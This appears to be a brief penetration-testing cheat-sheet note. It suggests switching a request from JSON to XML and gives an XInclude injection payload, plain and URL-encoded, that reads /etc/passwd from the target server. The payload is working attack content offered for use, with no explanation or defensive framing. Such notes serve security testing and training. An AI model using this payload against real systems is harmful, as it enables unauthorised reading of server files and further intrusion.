use this to convert json to xml when mucking around with content type:
https://www.freeformatter.com/json-to-xml-converter.html
_REMEMBER to get rid of `<root></root>` as required_

Xinjection: 
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
`%3Cfoo%20xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E%3C/foo%3E`
